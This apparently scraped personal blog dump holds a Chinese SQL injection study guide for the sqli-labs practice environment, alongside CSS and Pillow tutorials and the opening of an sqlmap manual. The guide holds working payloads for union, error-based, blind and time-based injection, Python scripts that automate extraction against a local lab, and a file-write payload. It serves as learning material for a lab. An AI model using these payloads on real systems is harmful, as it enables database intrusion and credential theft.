|默认值，将文本中的字母转换大写，转换为小写，每个单词首字母大写，空白会被浏览器忽略 || white-space|normal，pre，nowrap，pre-wrap，pre-line，inherit |默认值(空白被浏览器忽略)，空白被浏览器保留，文本不换行(直到遇到)，保留空白符序列，合并空白符序列，继承white-space || word-spacing |length |设置汉字或单词之间的空格的宽度 |1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ #text1{ color: #03f; letter-spacing: 6px; line-height: 37px; text-decoration: underline; text-indent: 2em; } #text2{ text-align: center; white-space: pre-wrap; text-transform: lowercase; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;text1&quot;&gt;Da4er&lt;/p&gt; &lt;p id=&quot;text2&quot;&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 2.字体属性| 属性 |属性值 |描述 | | font |除了font之外的其他字体属性值 |把所有针对字体的属性设置放在一个声明中 || font-size |xx-small，smaller，larger，length，% |绝对字体尺寸(默认值为medium)，相对字体尺寸(设置比父元素更小的尺寸)，相对字体尺寸(设置比父元素更大的尺寸)，设置字体大小为基于父元素的一个百分数 ||font-family |宋体，黑体 |设置字体族，优先级按字体族顺序从大到小 || font-weight |normal，lighter，bold，bolder |设置字体常规格式显示，设置字体加细，设置字体加粗，设置字体特粗 || font-style |normal，italic，oblique |字体常规格式显示，字体斜体显示，字体斜体显示 |12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p{ font-family: &quot;楷体&quot;,&quot;宋体&quot;; font-size: 5em; font-weight: 500; font-style: italic; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 3.背景属性| 属性 |属性值 |描述 | | background | 除background之外的任何的背景属性值 |将背景属性设置在一个声明中 || background-color |颜色值 |设置元素的背景颜色 || background-image |url(image_file_path) |设置元素的背景图像 || background-position |left，right，center，top，bottom |背景图像左，右，中，上，下对齐 ||background-attachment |scroll，fixed，inherit |设置背景图像是固定亦随着页面滚动，默认是滚动 |1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ body{ background-image: url(1.jpg); background-attachment: fixed; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 4.列表属性| 属性 |属性值 |描述 | |list-style |其他任意的列表属性值 |用于把所有用于列表的属性设置于一个声明中 || list-style-image |image_url |将图片设置为列表项前导符 || list-style-type |disc，circle，square，decimal，lower-roman，upper-roman，lower-alpha，upper-alpha，none |列表项前添加实点圆点，空心圆点，实心方块，普通的阿拉伯数字，小写罗马数字，大写罗马数字，小写英文字母，大写英文字母，不添加任何项目符号或编号 | 五.html文档中应用CSS1.行内式基本语法：&lt;标签名 style=”属性1：属性值1；属性2：属性值2；….”&gt; 2.内嵌式基本语法：1&lt;style type=&quot;text/css&quot;&gt; CSS样式 &lt;/style&gt; 3.链接式基本语法：1&lt;link rel=&quot;stylesheet&quot; type=&quot;type/css&quot; href=&quot;css文件&quot; /&gt; 4.导入式基本语法：1&lt;style type=&quot;text/css&quot;&gt; @import url(&quot;CSS样式文件名&quot;)；&lt;/style&gt; 六.CSS的冲突与解决当文件中有多个css对同一个元素进行不同格式设置，会出现css的冲突。解决原则:(1)优先级原则 (2)最近原则 (3)同一个属性的样式定义优先级的规定为:行内式样式&gt;内嵌式样式|链接外部样式 行内式样式的优先级最高 内嵌式样式和链接外部样式的优先级由它们出现的位置决定，谁出现在后面，谁的优先级就高。ID选择器的优先级最高。","link":"/2019/11/09/CSS%E5%9F%BA%E6%9C%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/"},{"title":"Mysql注入详解","text":"前言最近一直在学sql注入的专题，准备写个文章来记录这段时间学的过程。 一.有可显字段——使用常规注入法用到的注入语句：12345678and 1=1 --+and 1=2 --+order by 3 --+union select 1,2,3 --+union select 1,database(),version() --+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(':',username,password)) from users --+)常规的sql注入，通常有可显字段，通过在可显字段进行注入，从而达到注入的方法。以sqli-labs第一关为例用运用常规的sql注入 加入单引号，发现报错，这里我们可以用报错注入的方式。 通过对语句的闭合，发现单引号是sql语句的闭合符号。and 1=1 返回正常and 1=2 返回异常 用order by语句进行数据库的猜解order by 数字 是按照第几列升序排序order by 数字 DESC 是按照第几列降序排序我们用这条语句操作数据库，发现order by 4时报错，因为该数据库没有第四列，所以我们可以用order by语句进行对数据库列的猜解。猜解到该数据库有三列。 猜解可显字段先将id=1换成id=-1 或者运用其他方式让其报错，在运用union select联合查询语句发现2，3字段是可显字段。 查看当前数据库名和用户名运用database()，user()两个函数常用的还要version() 来查看数据库版本 猜解表名group_concat(xxx)这个函数通俗理解就是把xxx字段的数据聚合在一起返回。例如：group_concat(table_name)意思是将table_name字段中的数据全部返回。information_schema这个数据库保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。information_schema是在mysql5.0版本开始使用，像5.0之前的版本要是注入的话，只能像注入access数据库一样，进行猜解。information.schema.tables记录了整个mysql所有的表名table_schema指定数据库名 猜解字段名爆破字段名和爆破表名一样，只需要更改几个参数即可。爆出来字段名：username，password俩个字段 猜解字段内容运用2，3可显字段 一块查询username，password字段内容这里用到limit限定语句limit 0,1 意思是查询字段中的第一个内容limit 1,1 查询字段中第二个内容limit 数字，数字 第一个数字指定查询的内容(从0开始)，第二个数字指定返回的数量。不用limit语句也可以，还有一种注入语句1union select 1,2,group_concat(concat_ws(':',username,password)) from users用group_concat()聚合输出使用函数CONCAT_WS（）。使用语法为：CONCAT_WS(separator,str1,str2,…)CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）所以用上面的语句直接爆出users字段的所以内容。 二.无可显字段，有错误提示——报错注入启动了错误提示，并且出现在了浏览器中，即可运用报错注入 1.Floor语句报错注入用到注入语句：12341' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a)b)1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select concat(username,0x3a,password) from users limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)floor语句报错主要用到：floor()，concat()，count()，rand(),group by(1).floor()函数：floor(x) 向下取整，取小于等于x的最大整数。(2).concat(x,x1,x2):将x，x1，x2整合到一个字符串。(3).count() 返回指定表的行数(4).rand() 随机返回数字(5).group by+列名 按照某列分组先做个实验，使用创建好的一个user表count(*) 用count(*)，group by 联合使用，构建一个虚拟表 floor（rand(0)*2）返回是伪随机，规律是：011011；不给rand（）参数时，返回不确定 使用：1select count(*),concat(floor(rand(0)*2),(select version()))a from user group by x;报出错误： 运用上面的规律：以sqli-labs第一关为例第一关，虽然有可显字段，但是同样开启了错误显示，所以也可以用报错注入报错注入是不用猜解表中的字段有多少列的，所以我们直接用一开始给出的语句进行报错 爆当前的数据库名爆表名 爆字段名 爆字段内容 floor语句报错下面的几条博客不错1234567https://blog.csdn.net/he_and/article/details/80455884https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirecthttps://www.cnblogs.com/litlife/p/8472323.htmlhttps://blog.csdn.net/Fly_hps/article/details/79416620 2.extractvalue()函数报错注入用到的注入语句：12341' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+1' and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e)) --+extractvalue()用于对查询xml文档的函数有两个参数，其中第二个参数是可操作的地方 第二个参数必须是 /xxx/xxx/xxx/…这种格式，要不就报错，所以基于这个特性，可以进行报错注入以sqli-labs第五关为例：开启了错误提示 可以使用报错注入然后用上面的注入语句进行注入： updatexml()函数报错注入用到的注入语句：12341' and updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) --+1' and updatexml(0x7e,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0x7e) --+1' and updatexml(0x7e,concat(0x7e,(select column_name from information_schema.cloumns where table_name='users' limit 0,1),0x7e),0x7e) --+1' and updatexml(0x7e,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),0x7e) --+updatexml()函数与extractvalue()类似，是更新xml文档的函数。updatexml()有三个参数，其中第二个参数可操作 ，是xml的路径 必须是/xx/xx这种格式的 ，所以和上一个类似，构造注入语句以sqli-labs第五关为例：用上面的注入语句爆出数据版本爆出表名爆出字段名爆出字段内容 extractvalue()和updatexml()报错注入参考文章： https://blog.csdn.net/zpy1998zpy/article/details/80631036 报错注入的语句还有很多，但是主要还是上面三种，其他的语句和上面三种类似其他报错注入文章：https://www.cnblogs.com/wocalieshenmegui/p/5917967.html 三.无可显字段无错误提示,但出现数据提交正确和错误俩种不同页面这类注入利用属于盲注中的布尔盲注，在无可显字段无错误提示，但数据提交正确和错误两种不同页面时使用。有时在不能使用union select语句时，也会使用这类盲注。用的函数：12345678910111213141516171819202122- Length（）//返回字符串的长度Length（abc）返回3，表示abc字符串长度为3 - Substr（）//截取字符串Stbstr(abc,1,1) 返回a，从abc的第一位开始截，步长为1。 - mid() //取出字符串的一部分值mid(abc,1,1) 返回a，从abc的第一位开取，步长为1.与substr（）用法一致 - left() //取出字符串左边的几个数据left(abc,1) 返回aleft(abc,2) 返回ab - right() //取出右边的几个数据right(abc,1) 返回cright(abc,2) 返回bc - ord（）与 ascii（）//返回一个字符的ascii码值ascii(s) 返回114 - hex（） //返回16进制数用到的注入语句：1234length(database())&gt;7ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&gt;117ascii(substr((select username from users limit 0,1),1,1))&gt;6不需要union select 即可完成注入工作 以sqli-labs第八章为例 python脚本如下：1234567891011121314151617181920212223242526272829303132333435363738import requestsdef database_len(): for i in range(9999): url='''http://127.0.0.1/sqli/Less-8/''' payload='''?id=1' and length(database())&gt;%s''' %i #print(url+payload+' --+ ') r=requests.get(url+payload+' --+ ') if 'You are in' in r.text: print(i) else: print('database_length:',i) breakdatabase_len()def database_name(): databasename='' for i in range(1,9): for j in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz': url='''http://127.0.0.1/sqli/Less-8/''' payload='''?id=1' and substr(database(),%d,1) = '%s' ''' %(i,j) #print(url+payload+' --+ ') r=requests.get(url+payload+' --+ ') if 'You are in' in r.text: databasename += j print(databasename) break print(&quot;database_name:&quot;,databasename.lower())database_name()def table_length(): for j in range(9999): url='''http://127.0.0.1/sqli/Less-8/''' payload='''?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;%s''' %j r=requests.get(url+payload+' --+ ') if 'You are in' in r.text: print(j) else: print('firs table length:',j) breaktable_length()我只写了猜测当前数据库的长度，数据库名，第一张表的长度。剩下的都一样这里不在给出！123布尔盲注参考：https://blog.csdn.net/qq_41554179/article/details/88414079https://blog.csdn.net/Wu000999/article/details/100041049 四.无可显字段无错误提示，正确错误没有明显区别这类的sql注入类型，可以利用的方式是时间盲注。时间盲注又叫延迟注入，通过时间长短来判断是否执行成功。用到函数和布尔盲注差不多。if(条件，1，2) 如果条件满足，则执行1，不满足就执行2sleep(2) 延迟2秒钟用到的语句就多了上面两条注入语句：1234if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;11),sleep(2),1) --+if((ascii(substr((select column_name from information_schema.tables where table_name=‘users’ limit 0,1),1,1))&gt;11),sleep(2),1) --+ if((ascii(substr((select username from users limit 0,1),1,1))&gt;11),sleep(2),1) --+根据上面的语句构造python脚本：1234567891011121314151617181920212223242526272829303132333435import requestsimport datetimeimport timedef database_len(): for i in range(1,10): url='''http://127.0.0.1/sqli/Less-9/''' payload='''?id=1' and if(length(database())=%d,sleep(2),1)''' %i #print(url+payload+' --+ ') time1=datetime.datetime.now() r=requests.get(url+payload+' --+ ') time2=datetime.datetime.now() l=(time2-time1).seconds if l&gt;=2: print('database_len:',i) break #else: # print(i) # breakdatabase_len()def database_name(): name = '' for j in range(1, 9): for i in '0123456789abcdefghijklmnopqrstuvwxyz': url = '''http://127.0.0.1/sqli/Less-9/''' payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(2),1)''' % (j,i) time1 = datetime.datetime.now() r = requests.get(url + payload + ' --+ ') time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec &gt;= 2: name += i print(name) break print('database_name:', name)database_name()这个脚本中猜解了数据库的长度和名称，其他的猜解和这个基本一致。 五.post注入post注入其实就是注入位置的不同，其他的注入利用方式和前面的基本一致。主要是用到Burp Suite 进行抓包我们以sqli-labs第11关为例：用的注入语句：1234567' and 1=1 %23' order by 2 %23' union select 1,2 %23' union select database(),user() %23' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() %23' union select group_concat(column_name),2 from information_schema.columns where table_name='users' %23' union select username,password from users limit 0,1%23用burp抓包 发送到repeated模块加个单引号爆出错误判断字段数判断可显字段爆出数据库的表名爆字段名爆字段的内容 这里指举了一个很简单的例子，还有很多注入 其实post注入和get注入利用方式是一样的只不过是注入位置的不同。 六.insert，delete，update注入这些注入基本利用方式和上面的一样，只是注入位置的差别。insert语句用于向数据库插入数据-&gt;一般用在用户注册中，delete语句用于删除数据库的数据-&gt;比如删除留言板的数据update语句用于更新数据库的数据-&gt;比如修改用户信息123456insert into users(id,username,passowrd) values (2,''1'','Da4er);UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值DELETE FROM 表名称 WHERE 列名称 = 值这类的注入不在给出例子 ，向这三个类型的注入更多的是配合报错提示进行注入参考文章：1https://www.cnblogs.com/babers/articles/7252401.html这个可以做一下sqli-labs第十七关的update注入 七.http头注入http头注入本质还是注入位置的不同在有些应用中http头的信息会回显到浏览器，这个时候可以尝试一下http头注入，注入利用的方式和get类型的一样我们来以sqli-labs第18关注入user-agent头为例：配合报错注入来进行注入： 八.数字型，字符型，搜索型注入像这三类注入，是包含上面所有的注入利用方式的，这三类注入个大方面，意思是用户输入到服务器的参数是数字，字符串，还是搜索数据的。所以这三类是整个sql注入大的方面，这里不在叙述。只对搜索型注入进行分析搜索型注入主要用在搜索数据时，对搜索的参数过滤不全。搜索型注入的构造和其他两类不太一样，一般的要加%，这是sql里的匹配查找我们来看一下一个靶场搜索型注入的代码：123456789101112131415161718192021if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null){ //这里没有做任何处理，直接拼到select里面去了 $name=$_GET['name']; //这里的变量是模糊匹配，需要考虑闭合 $query=&quot;select username,id,email from member where username like '%$name%'&quot;; $result=execute($link, $query); if(mysqli_num_rows($result)&gt;=1){ $html2.=&quot;&lt;p class='notice'&gt;用户名中含有{$_GET['name']}的结果如下：&lt;br /&gt;&quot;; while($data=mysqli_fetch_assoc($result)){ $uname=$data['username']; $id=$data['id']; $email=$data['email']; $html1.=&quot;&lt;p class='notice'&gt;username：{$uname}&lt;br /&gt;uid:{$id} &lt;br /&gt;email is: {$email}&lt;/p&gt;&quot;; } }else{ $html1.=&quot;&lt;p class='notice'&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;&quot;; }}我们可以看到输入的name 被’%name%’包围，这就是搜索型注入的构造方式构造的payload：1ko%' and updatexml(0x7e,concat(0x7e,version(),0x7e),0x7e) or '%这里只爆出数据库版本，其他的就不在这里操作了，思路都是一样，利用报错注入。 九.宽字节注入宽字节注入是一种特殊的注入方式，其利用的思路和前面写的一样，只不过宽字节注入能绕过将单引号等特殊字符转义。原因是：网站用了utf-8编码，而数据库使用了GBK编码宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ \\ ” 。GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节mysql中用的转义函数：addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc以sqli第三十三关为例：发现可以运用宽字节注入，绕过防御措施。宽字节注入现在很少见了。这里只给出了爆当前数据库名的语句，其他的注入语句和上面写的报错注入一样。宽字节注入说白了就是绕过sql防御的一种收到，因为比较经典才会单拿出来提一下。 十.Mysql注入的高级利用这部分主要是如果我们的权限足够大，可以向网站写文件或读文件主要用到俩个语句：into outfile 和 load_file()11')) UNION SELECT 1,'&lt;?php echo &quot;Da4er&quot;?&gt;',3 into outfile 'D:\\1.txt' --+into outfile是向本地写文件的操作load_file()是读本地文件的操作 最后明天还会在写一篇sqlmap的使用教程，然后这个学期学安全的时间到此结束了，安心准备期末了~","link":"/2019/11/23/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"},{"title":"Python Pillow库学习","text":"一.安装pillow很简单直接:pip install pillow导入的时候python2和python3略有不同//python2import Image//python3(因为是派生的PIL库，所以要导入PIL中的Image)from PIL import Image 二.基本操作1.图片的打开和展示123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)im.show() open()打开图片show()展示图片 2.图片格式,宽高,模式123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)print(im.format,im.size,im.mode) format展示图像的格式(jpg,png等等)size属性是一个tuple,表示图像的宽和高mode表示图像的模式(RGB) 3.图片保存123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)im.save(&quot;/root/haha1.jpg&quot;) save()保存图片 4.convert()convert() 是图像实例对象的一个方法，接受一个 mode 参数，用以指定一种色彩模式，mode 的取值可以是如下几种：· 1 (1-bit pixels, black and white, stored with one pixel per byte)· L (8-bit pixels, black and white)· P (8-bit pixels, mapped to any other mode using a colour palette)· RGB (3x8-bit pixels, true colour)· RGBA (4x8-bit pixels, true colour with transparency mask)· CMYK (4x8-bit pixels, colour separation)· YCbCr (3x8-bit pixels, colour video format)· I (32-bit signed integer pixels)· F (32-bit floating point pixels)123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;).convert('L')im.show() 123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;).convert('RGB&quot;)im.show() 5.filter()用filter()需要导入PIL库中的ImageFilter模块123456789101112131415161718192021from PIL import Image, ImageFilterim = Image.open(‘1.png')# 高斯模糊im.filter(ImageFilter.GaussianBlur)# 普通模糊im.filter(ImageFilter.BLUR)# 边缘增强im.filter(ImageFilter.EDGE_ENHANCE)# 找到边缘im.filter(ImageFilter.FIND_EDGES)# 浮雕im.filter(ImageFilter.EMBOSS)# 轮廓im.filter(ImageFilter.CONTOUR)# 锐化im.filter(ImageFilter.SHARPEN)# 平滑im.filter(ImageFilter.SMOOTH)# 细节im.filter(ImageFilter.DETAIL) 6.获取图片尺寸,缩放图片1234567from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)w,h=im.sizeprint(w,h)im.thumbnail((w//2,h//2))#im=im.resize((217,154))print(&quot;Resize image to:%s %s&quot;%(w//2,h//2)) 7.截屏123from PIL import ImageGrabim=ImageGrab.grab((0,0,800,200))#截取屏幕指定区域的图像im=ImageGrab.grab()#全屏截屏 8.羽化1234from PIL import Image,ImageFilterim=Image.open(&quot;haha.jpg&quot;)im2=im.filter(ImageFilter.BLUR)im2.save('1.jpg','jpeg) 9.颜色与RGBA值传统的图片模式是RGB 即红绿蓝 ；RGBA是红绿蓝加上alpha(透明度)。RGBA的值表示为由4个整数组成的元组，分别R,G,B,A整数的范围0~255，RGB全0表示黑色，全255表示黑色。那么猜测(0,128,0,255)是绿色，因为G分量最大，R、B分量都是0，所以呈现出来是绿色。但是当alpha值为0时，无论什么颜色，该颜色都是不可见的。123from PIL import ImageColorprint(ImageColor.getcolor('green','RGBA'))print(ImageColor.getcolor('black','RGB')) 10.图像的坐标表示图像中左上角是坐标原点(0,0),这和平常数学里的坐标系不太一样。这样定义的坐标意味着，X轴是从左到右增长的，而Y轴是从上到下增长。在Pillow中如何使用上述定义的坐标系表示一块矩形区域?许多函数或方法要求提供一个矩形元组参数。元组参数包含四个值，分别代表矩形四条边的距离X轴或者Y轴的距离。顺序是(左，顶，右，底)。右和底坐标稍微特殊，表示直到但不包括。比如(3,2,8,9)就表示横坐标[3,7];纵坐标[2,8]的矩形区域。 11.新建图像(new())new()有三个参数 第一个参数是mode即颜色空间模式，第二个参数指定了图像的分辨率(宽×高)，第三个参数是颜色(可以省略)第三个参数颜色:可以直接填入常用颜色名称(red,green,blue);也可以填入十六进制表示的颜色，如#FF0000表示红色；还能传入元组，如(255,0,0,255)表示红色 12.更改单个像素点(putpixel())getpixel() 获取单个像素点的RGB或者RGBA值putpixel()在单个像素点上添加RGB或者RGBA值123456789from PIL import ImageColor,Imageim=Image.new('RGB',(200,200))print(im.getpixel((0,0)))for i in range(200): for j in range(100): im.putpixel((i,j),(210,210,210)) for z in range(100,200): im.putpixel((i,z),(255,0,0))im.save(&quot;4.png&quot;) 13.图片的剪贴，黏贴(1)图片的剪贴12345from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)box=(100,100,450,300)region=im.crop(box)region.show() box这是一个4元的坐标数组,坐标轴是左上角是(0,0)的卡迪尔坐标系。box(x1,y1,x2,y2) (2)图片的黏贴paste() 图片黏贴方法paste(要贴的图片，要贴的图片的4元坐标组成的区域)1234567from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)box=(50,50,200,200)region=im.crop(box)#region=region.transpose(Image.ROTATE_180)im.paste(region,box)im.show() 14.调整图像大小resize((x,y)) 将图片改成宽为x，高为y的图片123456from PIL import Imageim=Image.open('haha.jpg')width,height=im.size#print(width,height)resizeim=im.resize((width,height+10))resizeim.show() 15.旋转和翻转图像12345from PIL import Imageim=Image.open('haha.jpg')im.rotate(90).show()im.rotate(270).show()im.rotate(180).show() 处理GIF等序列文件使用seek和tell方法可以在不同帧移动，tell是帧数，而seek是取当前帧数的图片。12345from PIL import Imageim=Image.open('1.gif')while 1: im.seek(im.tell()+1) im.show() 三.常用脚本1.LSBLSB最低位隐写 就是把隐藏的信息放到每个像素的最低位 LSB是将原本的像素转8位2进制，将8位2进制的左后一位置0或者置1来隐写数据，所以我们可以枚举所有像素，当该位像素最后一位不为0时，置为255的黑点。1234567891011from PIL import Imageimg=Image.open('01.png')width,height=img.sizefor i in range(0,width): for j in range(0,height): tmp=img.getpixel((i,j)) if tmp&amp;0x1==0: img.putpixel((i,j),0) else: img.putpixel((i,j),255)img.show() 2.RGB画图1234567891011121314151617from PIL import Imagex = 280 #x坐标 通过对txt里的行数进行整数分解y = 280 #y坐标 x * y = 行数im = Image.new(&quot;RGB&quot;, (x, y)) #创建图片file = open('flag.txt') #打开rbg值的文件#通过每个rgb点生成图片for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 rgb = line.split(&quot;, &quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #将rgb转化为像素im.show() 3.图片去污垢1234567891011121314151617181920212223from PIL import Imagelena = Image.open('1.png')pixsels = lena.load()width=lena.size[0]height=lena.size[1]list1=[]for x in range(0,width): for y in range(0,height): r,g,b=pixsels[x,y] if r==255 and g==255: pass else: if int(bin(b)[-1])==1: list1.append(0) else: list1.append(1)print (len(list1))im=Image.new(&quot;1&quot;,(300,300))i=0while i&lt;len(list1): im.putpixel((i%300,i/300),list1[i]) i=i+1im.save(&quot;2.png&quot;) 4.方向建画图12345678910111213141516171819202122232425262728293031323334from PIL import ImageMAX=1000pic=Image.new(&quot;RGB&quot;,(MAX,MAX))str=&quot;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&quot;flagx=10flagy=50for y in range(0,MAX): for x in range(0,MAX): pic.putpixel([x,y],(255,255,255))for key in str: if key==&quot;R&quot;: for x in range(0,5): pic.putpixel([flagx+x,flagy],(0,0,0)) flagx=flagx+5 if key==&quot;D&quot;: for x in range(0,5): pic.putpixel([flagx,flagy+x],(0,0,0)) flagy+=5 if key==&quot;L&quot;: for x in range(0,5): pic.putpixel([flagx-x,flagy],(0,0,0)) flagx-=5 if key==&quot;U&quot;: for x in range(0,5): pic.putpixel([flagx,flagy-x],(0,0,0)) flagy-=5pic.show()pic.save(&quot;flag.png&quot;) 当然常用脚本不只这些 python对图片处理有着强大的功能，还需不断学习。 第二篇文章了，不知道有没有人看，希望自己坚持下去！！","link":"/2019/11/08/Python-Pillow%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"title":"SQLMAP使用手册","text":"前言sqlmap是sql注入中使用的神器，也是渗透测试人员必须掌握的工具。因为最近在学习sql注入的专题，所以写下笔记来记录学习。 sqlmap使用选项1234-h, --help 显示基本帮助信息-hh 显示高级帮助信息--version 显示程序版本号-v VERBOSE 赘言级别：0-6(默认 1) 目标1234567-d DIRECT 直接连接到数据库-u URL, --url=URL 目标URL(e.g. &quot;www.target.com/vuln.php?id=1&quot;)-l LOGFILE 从Burp 或 WebScarab 日志中解析目标-m BULKFILE 在给定的文本文件中读取多个扫描目标-g GOOGLEDORK 将Google dork 结果作为目标URL-r REQUESTFILE 从文件中读取HTTP 请求-c CONFIGFILE 从INI 配置文件中读取配置选项 请求1234567891011121314151617181920212223242526272829303132--data=DATA 通过POST 方法提交的数据字符串--param-del=PDEL 用于分割参数值的字符--cookie=COOKIE HTTP Cookie 头--cookie-del=CDEL 用于分割cookie 值的字符--load-cookies=L.. 包含cookies 的Netscape/wget 格式文件--drop-set-cookie 忽略响应中的Set-Cookie 头--user-agent=AGENT HTTP User-Agent 头--random-agent 使用随机选择的HTTP 